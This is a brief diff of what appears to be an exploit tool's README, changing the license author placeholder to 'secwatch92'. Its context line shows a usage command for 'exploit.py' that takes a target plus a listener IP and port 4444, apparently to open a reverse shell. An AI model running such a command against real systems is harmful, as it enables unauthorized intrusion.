@@ -114,4 +114,4 @@ python3 exploit.py <target> --https --lhost <your_ip> --lport 4444 \
 
 ## 📄 License
 
-MIT License © 2025 `<YourName>`
+MIT License © 2025 `secwatch92`
